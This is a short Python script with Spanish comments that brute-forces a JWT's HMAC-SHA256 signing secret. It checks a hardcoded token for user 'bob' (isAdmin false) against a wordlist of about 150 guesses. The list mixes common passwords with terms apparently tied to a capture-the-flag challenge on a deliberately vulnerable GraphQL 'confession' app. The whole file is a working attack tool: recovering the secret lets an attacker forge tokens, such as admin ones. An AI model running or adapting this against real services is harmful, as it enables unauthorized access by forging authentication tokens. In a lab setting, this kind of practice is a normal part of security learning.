#!/usr/bin/env python3
import hmac
import hashlib
import base64

# JWT original de bob
original_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJvYiIsImlzQWRtaW4iOmZhbHNlLCJpYXQiOjE3NTQ2NDM4MDF9.uu-fBxfW6tv7xnh8JsLc9D3PJ1s67pFrJ8g03wMPims"

# Separar las partes
parts = original_jwt.split('.')
header = parts[0]
payload = parts[1]
signature = parts[2]

# Decodificar la firma original
def base64url_decode(data):
    # Agregar padding si es necesario
    padding = 4 - (len(data) % 4)
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)

original_signature = base64url_decode(signature)
message = f"{header}.{payload}"

# Lista extendida de posibles secretos
secrets = [
    # Básicos
    "secret", "Secret", "SECRET", "password", "Password", "PASSWORD",
    "123456", "12345", "1234", "123", "admin", "Admin", "ADMIN",
    
    # Relacionados con GraphQL
    "graphql", "GraphQL", "GRAPHQL", "graphql-secret", "graphql_secret",
    "graphql-key", "graphql_key", "graphqlkey", "graphqlsecret",
    
    # Relacionados con confession
    "confession", "Confession", "CONFESSION", "confessions", "Confessions",
    "confession-secret", "confession_secret", "confessionkey",
    
    # Relacionados con el desarrollador
    "Anugrah", "anugrah", "ANUGRAH", "SR", "sr", "AnugrahSR", "anugrahsr",
    "Security", "security", "Consultant", "consultant",
    "SecOps", "secops", "SECOPS", "SecOpsGroup", "secopsgroup",
    
    # Relacionados con la app
    "vulnmachines", "Vulnmachines", "VULNMACHINES", "hackme", "hackme3",
    "vulnerable", "vulnerability", "vuln",
    
    # JWT relacionados
    "jwt", "JWT", "jwtsecret", "jwt-secret", "jwt_secret",
    "token", "Token", "TOKEN", "tokensecret", "token-secret",
    
    # Otros comunes
    "key", "Key", "KEY", "secretkey", "secret-key", "secret_key",
    "auth", "Auth", "AUTH", "authentication", "Authentication",
    "test", "Test", "TEST", "demo", "Demo", "DEMO",
    "default", "Default", "DEFAULT", "dev", "Dev", "DEV",
    "development", "Development", "DEVELOPMENT",
    "prod", "production", "Production", "PRODUCTION",
    
    # Simples
    "a", "1", "12", "111", "1111", "11111", "111111",
    "0", "00", "000", "0000", "00000", "000000",
    "qwerty", "QWERTY", "asdf", "ASDF", "zxcv", "ZXCV",
    
    # Relacionados con el reto
    "introspection", "Introspection", "INTROSPECTION",
    "rules", "Rules", "RULES", "introspection_rules",
    "introspection-rules", "introspectionrules",
    
    # Frases del reto
    "please share the flag", "pleasesharetheflag", "share the flag",
    "Hack the planet", "hacktheplanet", "hack", "planet",
    
    # Otros intentos
    "supersecret", "super-secret", "super_secret",
    "verysecret", "very-secret", "very_secret",
    "topsecret", "top-secret", "top_secret"
]

print(f"Testing {len(secrets)} possible secrets...")

for secret in secrets:
    # Calcular HMAC-SHA256
    calculated_signature = hmac.new(
        secret.encode(),
        message.encode(),
        hashlib.sha256
    ).digest()
    
    # Comparar con la firma original
    if calculated_signature == original_signature:
        print(f"\n[SUCCESS] Found secret: '{secret}'")
        print(f"Original JWT: {original_jwt}")
        print(f"Secret key: {secret}")
        break
else:
    print("\n[FAILED] Secret not found in the list")